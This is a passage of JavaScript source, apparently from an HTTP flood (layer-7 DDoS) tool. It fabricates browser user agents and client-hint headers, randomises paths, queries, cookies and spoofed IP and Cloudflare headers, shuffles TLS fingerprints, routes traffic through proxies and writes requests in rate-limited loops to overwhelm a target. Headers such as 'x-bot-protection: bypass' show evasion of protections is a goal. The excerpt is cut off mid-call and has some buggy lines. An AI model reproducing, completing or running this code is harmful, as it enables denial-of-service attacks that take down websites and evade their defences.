            sec_ch_ua = `\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6400, 6600)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not;A=Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 126:
            sec_ch_ua = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6500, 6790)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 127:
            sec_ch_ua = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6600, 6800)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 128:
            sec_ch_ua = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6600, 6900)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 129:
            sec_ch_ua = `\"${browser}\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6500, 7000)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"${browser}\";v=\"${sec_ch_ua_full_version}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 130:
            sec_ch_ua = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6600, 7100)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 131:
            sec_ch_ua = `\"${browser}\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"24\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6700, 7200)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"${browser}\";v=\"${sec_ch_ua_full_version}\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"Not_A Brand\";v=\"24.0.0.0\"`;
            break;
        case 132:
            sec_ch_ua = `\"Not A(Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6800, 7300)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not A(Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 133:
            sec_ch_ua = `\"Not.A/Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6900, 7400)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not.A/Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 134:
            sec_ch_ua = `\"Not A(Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7000, 7500)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not A(Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 135:
            sec_ch_ua = `\"${browser}\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not.A/Brand\";v=\"24\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7100, 7600)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"${browser}\";v=\"${sec_ch_ua_full_version}\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"Not.A/Brand\";v=\"24.0.0.0\"`;
            break;
        case 136:
            sec_ch_ua = `\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7200, 7700)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not;A=Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 137:
            sec_ch_ua = `\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7300, 7800)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not.A/Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 138:
            sec_ch_ua = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7400, 7900)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 139:
            sec_ch_ua = `\"${browser}\";v=\"${version}\", \"Not:A-Brand\";v=\"24\", \"Chromium\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7500, 8000)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"${browser}\";v=\"${sec_ch_ua_full_version}\", \"Not:A-Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 140:
            sec_ch_ua = `\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7600, 8100)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not;A=Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 141:
            sec_ch_ua = `\"Not A(Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7700, 8200)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not A(Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 142:
            sec_ch_ua = `\"${browser}\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not.A/Brand\";v=\"24\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7800, 8300)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"${browser}\";v=\"${sec_ch_ua_full_version}\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"Not.A/Brand\";v=\"24.0.0.0\"`;
            break;
        case 143:
            sec_ch_ua = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(7900, 8400)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 144:
            sec_ch_ua = `\"Not?A_Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(8000, 8500)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not?A_Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 145:
            sec_ch_ua = `\"${browser}\";v=\"${version}\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(8100, 8600)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"${browser}\";v=\"${sec_ch_ua_full_version}\", \"Not;A=Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 146:
            sec_ch_ua = `\"Not.A/Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(8200, 8700)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not.A/Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 147:
            sec_ch_ua = `\"${browser}\";v=\"${version}\", \"Not A(Brand\";v=\"24\", \"Chromium\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(8300, 8800)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"${browser}\";v=\"${sec_ch_ua_full_version}\", \"Not A(Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 148:
            sec_ch_ua = `\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(8400, 8900)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not;A=Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 149:
            sec_ch_ua = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(8500, 9000)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 150:
            sec_ch_ua = `\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(8600, 9100)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not;A=Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        default:
            sec_ch_ua = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6500, 7600)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
    }

    const platforms = [
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "Macintosh; Intel Mac OS X 10_15_7",
        "Macintosh; Intel Mac OS X 10_15_7",
        "Macintosh; Intel Mac OS X 11_0_0",
        "Macintosh; Intel Mac OS X 11_1_0",
        "Macintosh; Intel Mac OS X 11_2_0",
        "Macintosh; Intel Mac OS X 11_3_0",
        "Macintosh; Intel Mac OS X 11_4_0",
        "Macintosh; Intel Mac OS X 11_5_0",
        "Macintosh; Intel Mac OS X 12_0_0",
        "Macintosh; Intel Mac OS X 12_1_0",
        "Macintosh; Intel Mac OS X 12_2_0",
        "Macintosh; Intel Mac OS X 12_3_0",
        "Macintosh; Intel Mac OS X 12_4_0",
        "Macintosh; Intel Mac OS X 12_5_0",
        "Macintosh; Intel Mac OS X 12_6_0",
        "Macintosh; Intel Mac OS X 12_7_0",
        "Macintosh; Intel Mac OS X 13_0_0",
        "Macintosh; Intel Mac OS X 13_1_0",
        "Macintosh; Intel Mac OS X 13_2_0",
        "Macintosh; Intel Mac OS X 13_3_0",
        "Macintosh; Intel Mac OS X 13_4_0",
        "Macintosh; Intel Mac OS X 13_5_0",
        "Macintosh; Intel Mac OS X 13_6_0",
        "Macintosh; Intel Mac OS X 14_0_0",
        "Macintosh; Intel Mac OS X 14_1_0",
        "Macintosh; Intel Mac OS X 14_2_0",
        "Macintosh; Intel Mac OS X 14_3_0",
        "Macintosh; Intel Mac OS X 14_4_0",
        "Macintosh; Intel Mac OS X 14_5_0",
        "Macintosh; Intel Mac OS X 14_6_0",
        "Macintosh; Intel Mac OS X 14_7_1",
        "Macintosh; Intel Mac OS X 14_7_1",
        "Macintosh; Intel Mac OS X 14_7_1",
        "Macintosh; Intel Mac OS X 14_7_1",
        "Macintosh; Intel Mac OS X 14_7_1",
        "Macintosh; Intel Mac OS X 14_7_1",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64",
        "X11; Linux x86_64"
    ];

    const platform = platforms[Math.floor(Math.random() * platforms.length)];

    var sec_ch_ua_platform, sec_ch_ua_arch, platform_version;
    if (platform.includes('Windows')) {
        sec_ch_ua_platform = "\"Windows\"";
        sec_ch_ua_arch = "x86";
        platform_version = "\"10.0.0\"";
    } else if (platform.includes('Macintosh')) {
        sec_ch_ua_platform = "\"macOS\"";
        sec_ch_ua_arch = "arm64";
        platform_version = "\"14.0.0\"";
    } else if (platform.includes('Linux')) {
        sec_ch_ua_platform = "\"Linux\"";
        sec_ch_ua_arch = "x86";
        platform_version = "\"6.0.0\"";
    } else {
        sec_ch_ua_platform = "\"Windows\"";
        sec_ch_ua_arch = "x86";
        platform_version = "\"10.0.0\"";
    }

    var user_agent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;

    if (ua_opt) {
        user_agent = ua_opt;
    }

    var referer;
    if (referer_opt) {
        const extensions = ['com', 'net', 'org', 'io', 'co', 'gov', 'edu', 'info', 'xyz', 'app', 'dev', 'tech', 'online', 'site', 'space'];
        const extension = extensions[Math.random(Math.floor() * extensions.length)];
        try {
            if (referer_opt === "RAND") {
                const random_subdomain = random_string(random_int(6, 15));
                const random_path = random_string(random_int(4, 12));
                referer = `https://${random_subdomain}.${extension}/${random_path}`;
            } else {
                const referer_url = new URL(referer_opt);
                referer = referer_url.href;
            }
        } catch (err) {
            referer = url.href;
        }
    }

    var pathname = reqObj.path;
    if (pathname === "" && !query_opt) {
        pathname = "/"
    }

    if (pathname.includes('%RAND%')) pathname = pathname.replace("%RAND%", random_string(random_int(6, 15)));

    if (randpath) {
        const pathname_length = pathname.length;
        const random_segments = random_int(1, 4);
        let random_path = '';
        for (let i = 0; i < random_segments; i++) {
            random_path += `/${random_string(random_int(4, 12))}`;
        }
        if (pathname[pathname_length-1] !== "/") {
            pathname = `${pathname}${random_path}`;
        } else {
            pathname = `${pathname}${random_path.substring(1)}`;
        }
    }

    if (query_opt) {
        const num_params = random_int(1, 5);
        let query_string = '?';
        for (let i = 0; i < num_params; i++) {
            const param_name = random_string(random_int(4, 10));
            const param_value = random_string(random_int(3, 15));
            query_string += `${param_name}=${param_value}`;
            if (i < num_params - 1) query_string += '&';
        }
        pathname = pathname + query_string;
    }

    let request_method = reqmethod;
    if (reqmethod === "RAND") request_method = request_methods[~~Math.floor(Math.random() * request_methods.length)]

    let content_length = 0;
    if (data_opt !== undefined) {
        content_length = Buffer.from(data_opt, 'utf-8').length;
    } else if (data_opt === "RAND") {
        content_length = Buffer.from(random_string(random_int(10, 300)), 'utf-8').length;
    }

    if (cookie_opt === 'RAND') {
        reqObj.mode = 'RAND';
    } else if (cookie_opt === 'CLOUDFLARE') {
        reqObj.mode = 'CLOUDFLARE';
    }

    if (reqObj.mode === 'RAND') {
        cookie_opt = random_cookies();
    } else if (reqObj.mode === 'CLOUDFLARE') {
        cookie_opt = cloudflare_cookies(reqObj.path);
    }

    const cache_header = cache_opt ? "no-cache" : "max-age=0";

    const headers = Object.entries({
        ":method": request_method,
        ":authority": url.hostname,
        ":scheme": "https",
        ":path": pathname
    }).concat(Object.entries({
        "cache-control": cache_header,
        ...(request_method === "POST" && { "content-length": content_length }),
        ...(request_method === "POST" && { "content-type": "application/x-www-form-urlencoded" }),
        "sec-ch-ua": ua_opt ? sec_ch_ua : profile["sec-ch-ua"],
        ...(full_headers && { "sec-ch-ua-arch": sec_ch_ua_arch }),
        ...(full_headers && { "sec-ch-ua-bitness": "\"64\"" }),
        ...(full_headers && { "sec-ch-ua-full-version": sec_ch_ua_full_version }),
        ...(full_headers && { "sec-ch-ua-full-version-list": sec_ch_ua_full_version_list }),
        "sec-ch-ua-mobile": "?0",
        ...(full_headers && { "sec-ch-ua-model": "\"\"" }),
        "sec-ch-ua-platform": ua_opt ? sec_ch_ua_platform : profile["sec-ch-ua-platform"],
        ...(full_headers && { "sec-ch-ua-platform-version": platform_version }),
        "upgrade-insecure-requests": "1",
        "user-agent": ua_opt ? user_agent : profile['user-agent'],
        "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        ...(Math.random() < 0.36 && extra_headers && { "sec-purpose": "prefetch;prerender" }),
        ...(Math.random() < 0.36 && extra_headers && { "purpose": "prefetch" }),
        "sec-gpc": "1",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": languages[~~Math.random(Math.floor() * languages.length)],
        ...(Math.random() < 0.38 && extra_headers && { "if-modified-since": reqObj.timestamp }),
        ...(Math.random() < 0.37 && extra_headers && { "dnt": "1" }),
        ...(full_headers && { "x-forwarded-for": Math.random() < 0.36 ? `${random_ip()}, ${reqObj.proxy}` : reqObj.proxy }),
        ...(full_headers && { "x-forwarded-proto": protocol }),
        ...(full_headers && { "x-forwarded-scheme": protocol }),
        ...(full_headers && { "x-real-ip": reqObj.proxy }),
        "priority": 'u=0, i',
        ...(referer && { "referer": referer }),
        ...(cookie_opt && { "cookie": cookie_opt }),
        ...(Math.random() < 0.5 && { "cf-ray": `${random_string(16)}-${['SIN', 'LHR', 'FRA', 'JFK', 'LAX', 'NRT', 'HKG', 'SYD', 'CDG', 'DXB'][~~Math.random(Math.floor() * 10)]}` }),
        ...(Math.random() < 0.4 && { "cf-ipcountry": ['US', 'GB', 'DE', 'FR', 'JP', 'AU', 'CA', 'BR', 'IN', 'SG', 'KR', 'NL', 'IT', 'ES', 'SE'][~~Math.random(Math.floor() * 15)] }),
        ...(Math.random() < 0.4 && { "cf-connecting-ip": random_ip() }),
        ...(Math.random() < 0.4 && { "cf-visitor": `{"scheme":"https"}` }),
        ...(Math.random() < 0.3 && { "x-request-id": random_string(32) }),
        ...(Math.random() < 0.25 && { "x-b3-traceid": random_string(32) }),
        ...(Math.random() < 0.25 && { "x-b3-spanid": random_string(16) }),
        ...(Math.random() < 0.25 && { "x-b3-sampled": Math.random() < 0.5 ? "1" : "0" }),
        ...(Math.random() < 0.35 && { "x-forwarded-for": `${random_ip()}, ${random_ip()}, ${random_ip()}` }),
        ...(Math.random() < 0.3 && { "x-real-ip": random_ip() }),
        ...(Math.random() < 0.3 && { "x-original-forwarded-for": random_ip() }),
        ...(Math.random() < 0.25 && { "x-client-ip": random_ip() }),
        ...(Math.random() < 0.25 && { "x-remote-ip": random_ip() }),
        ...(Math.random() < 0.25 && { "x-remote-addr": random_ip() }),
        ...(Math.random() < 0.2 && { "x-cluster-client-ip": random_ip() }),
        ...(Math.random() < 0.2 && { "x-proxy-user-ip": random_ip() }),
        ...(full_headers && { "sec-ch-ua-arch": `"${['x86', 'arm64', 'x86_64'][~~Math.random(Math.floor() * 3)]}"` }),
        ...(full_headers && { "sec-ch-ua-bitness": `"${Math.random() < 0.7 ? '64' : '32'}"` }),
        ...(full_headers && { "sec-ch-ua-model": `"${['', 'iPhone', 'SM-G998B', 'Pixel 6 Pro', 'MacBookPro18,3'][~~Math.random(Math.floor() * 5)]}"` }),
        ...(Math.random() < 0.3 && { "x-http-method-override": ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'][~~Math.random(Math.floor() * 5)] }),
        ...(Math.random() < 0.25 && { "x-requested-with": ['XMLHttpRequest', 'Fetch', 'ShockwaveFlash/32.0.0.465', 'com.android.browser'][~~Math.random(Math.floor() * 4)] }),
        ...(Math.random() < 0.2 && { "x-ddos-protection": "1" }),
        ...(Math.random() < 0.15 && { "x-attack-mode": "true" }),
        ...(Math.random() < 0.15 && { "x-bot-protection": "bypass" }),
        ...(Math.random() < 0.2 && { "x-forwarded-proto": ['http', 'https'][~~Math.random(Math.floor() * 2)] }),
        ...(Math.random() < 0.2 && { "x-forwarded-scheme": ['http', 'https'][~~Math.random(Math.floor() * 2)] }),
        ...(Math.random() < 0.15 && { "pragma": "no-cache" }),
        ...(Math.random() < 0.15 && { "expires": "0" }),
        ...(Math.random() < 0.2 && { "connection": ['keep-alive', 'close', 'upgrade'][~~Math.random(Math.floor() * 3)] }),
        ...(Math.random() < 0.1 && { "upgrade": "websocket" }),
        ...(Math.random() < 0.1 && { "sec-websocket-version": "13" }),
        ...(Math.random() < 0.1 && { "range": `bytes=${random_int(0, 1000)}-${random_int(1001, 10000)}` }),
        ...(Math.random() < 0.1 && { "if-range": random_string(32) }),
        ...(Math.random() < 0.2 && { "content-encoding": ['gzip', 'deflate', 'br'][~~Math.random(Math.floor() * 3)] }),
        ...(Math.random() < 0.15 && { "content-language": ['en-US', 'en-GB', 'vi-VN', 'ja-JP', 'zh-CN'][~~Math.random(Math.floor() * 5)] }),
        ...(full_headers && { "x-timezone": ['America/New_York', 'Europe/London', 'Asia/Tokyo', 'Australia/Sydney', 'Europe/Paris'][~~Math.random(Math.floor() * 5)] }),
        ...(full_headers && { "x-location": ['US', 'GB', 'JP', 'AU', 'FR', 'DE'][~~Math.random(Math.floor() * 6)] })
    })).filter(a => a[1] != null);
    
    requestAddHeaders(reqObj, Object.fromEntries(headers));
    requestOrderHeaders(reqObj);
    return reqObj;
}

function requestUpdateHeaders(reqObj) {
    if (reqObj.path !== undefined && reqObj.path !== url.pathname) {
        requestReplaceHeader(reqObj, ":path", reqObj.path);
    }
    requestOrderHeaders(reqObj);
    return reqObj;
}

function requestRemoveHeader(reqObj, header) {
    const index = reqObj.headers.findIndex(([header_index, _]) => header_index === header);
    if (index > -1) {
        reqObj.headers.splice(index, 1);
    }
    return reqObj;
}

function requestOrderHeaders(reqObj) {
    const order = [
        ":method",
        ":authority",
        ":scheme",
        ":path",
        "cache-control",
        "content-length",
        "content-type",
        "sec-ch-ua",
        "sec-ch-ua-arch",
        "sec-ch-ua-bitness",
        "sec-ch-ua-full-version",
        "sec-ch-ua-full-version-list",
        "sec-ch-ua-mobile",
        "sec-ch-ua-model",
        "sec-ch-ua-platform",
        "sec-ch-ua-platform-version",
        "upgrade-insecure-requests",
        "user-agent",
        "accept",
        "sec-gpc",
        "accept-language",
        "accept-encoding",
        "sec-fetch-site",
        "sec-fetch-mode",
        "sec-fetch-user",
        "sec-fetch-dest",
        "if-modified-since",
        "dnt",
        "priority",
        "referer",
        "cookie",
        "x-forwarded-for",
        "x-forwarded-proto",
        "x-forwarded-scheme",
        "cf-ray",
        "cf-ipcountry",
        "cf-connecting-ip",
        "x-request-id",
        "x-b3-traceid",
        "x-b3-spanid",
        "x-forwarded-for",
        "x-real-ip",
        "x-original-forwarded-for",
        "x-client-ip",
        "x-remote-ip",
        "x-remote-addr",
        "x-http-method-override",
        "x-requested-with",
        "x-ddos-protection",
        "x-attack-mode",
        "x-bot-protection"
    ];

    const order_map = new Map(order.map((header, index) => [header, index]));

    reqObj.headers.sort((a, b) => {
        const indexA = order_map.get(a[0]);
        const indexB = order_map.get(b[0]);
        
        if (indexA === undefined && indexB === undefined) {
            return a[0].localeCompare(b[0]);
        }
        if (indexA === undefined) return 1;
        if (indexB === undefined) return -1;
        return indexA - indexB;
    });
}

function requestBuildStr(reqObj) {
    requestRemoveHeader(reqObj, "priority");
    requestAddHeader(reqObj, "Host", url.hostname);
    let request_str = `GET ${reqObj.path} HTTP/1.1\r\n`;

    for (const [k, v] of reqObj.headers) {
        if (!k.startsWith(":")) {
            request_str += `${k}: ${v}\r\n`;
        }
    }

    request_str += 'Connection: keep-alive\r\n\r\n';
    return request_str;
}

function rate_range(base) {
    const rate_eq = (base * 50) / 100;
    const min_range = base - rate_eq;
    const max_range = base + rate_eq;

    return {
        min: Math.max(0, min_range),
        max_range
    };
}

function random_fingerprint() {
    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
    const extension = extensions[random_int(0, extensions.length - 1)];
    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];

    const ja3 = `${version},${cipher},${extension},${curve}`;

    return crypto.createHash('md5').update(ja3).digest('hex');
}

const process_rate = () => {
    if (randrate === "") {
        rate = ratelimit
    } else if (randrate.includes('-')) {
        let rate_parts = randrate.split('-')
        var minimum, maximum;
        if (rate_parts.length == 2) {
            try {
                minimum = parseInt(rate_parts[0]);
                maximum = parseInt(rate_parts[1]);
                if (minimum > maximum) {
                    rate = random_int(maximum, minimum);
                } else {
                    rate = random_int(minimum, maximum)
                }
                rate = random_int(parseInt(rate_parts[0]), parseInt(rate_parts[1]))
            } catch (err) {
                rate = random_int(1, 90)
            }
        }
    } else if (randrate === "true") {
        rate = random_int(1, 128)
    } else if (randrate !== "") {
        try {
            const base_rate = parseInt(randrate)
            const range = rate_range(base_rate, 50);
            rate = random_int(range.min, range.max);
        } catch (err) {
            rate = random_int(1, 90)
        }
    }

    return rate
}

function shuffle_tls_settings() {
    var shuffled_ciphers = ciphers
      .map(cipher => ({ cipher, sort: Math.random() }))
      .sort((a, b) => a.sort - b.sort)
      .map(({ cipher }) => cipher);
    shuffled_ciphers = shuffled_ciphers.slice(0, Math.floor(Math.random() * (shuffled_ciphers.length - 7 + 1)) + 7)

    var shuffled_sigalgs = sigalgs
        .map(sigalg => ({ sigalg, sort: Math.random() }))
        .sort((a, b) => a.sort - b.sort)
        .map(({ sigalg }) => sigalg);
    shuffled_sigalgs = shuffled_sigalgs.slice(0, Math.floor(Math.random() * shuffled_sigalgs.length) + random_int(4, shuffled_sigalgs.length))

    var shuffled_curves = curves
        .map(curve => ({ curve, sort: Math.random() }))
        .sort((a, b) => a.sort - b.sort)
        .map(({ curve }) => curve);
    shuffled_curves = shuffled_curves.slice(0, Math.floor(Math.random() * shuffled_curves.length) + random_int(1, 2))

    return {
      shuffled_ciphers,
      shuffled_sigalgs,
      shuffled_curves,
    };
}

const start = async (host, port, proto, options = {}) => {
    const timeout = (duration) => {
        setTimeout(async () => {
            await start(host, port, proto);
        }, duration);
    }
        const proxy = createProxyObject(host, port, proto, options.username, options.password);
        await proxyConnect(proxy, options).then(async (socket) => {
            var request = createRequestObject(url.pathname);
            requestSetPath(request, url.pathname);
            if (protocol === "http") {
                socket.on('data', (data) => {
                    const response = data.toString('utf8');
                        const status_regex = response.match(/HTTP\/1\.0 (\d{3})/);

                        if (status_regex) {
                            const status = parseInt(status_regex[1]);
                            status_codes[status] = (status_codes[status] || 0) + 1;

                            if (status == 429 && ratelimit_opt) {
                                tls_conn.emit('ratelimit', 10);
                            }
                        }
                })
                const sendHTTP = () => {
                    socket.write(headers, (err) => {
                        if (!err) {
                            setTimeout(() => {
                                sendHTTP()
                            }, slowmo ? 1000 : (1000 + (Math.random() * 10)) / ratelimit);
                        } else {
                            proxyClose(proxy);
                        }
                    })
                }
                for (let i = 0; i < ratelimit; i++) {
                    const headers = requestBuildStr(request);
                    socket.write(headers)
                }
            }

            const { shuffled_ciphers, shuffled_sigalgs, shuffled_curves } = shuffle_tls_settings();
            const tls_conn = tls.connect({
                socket: socket,
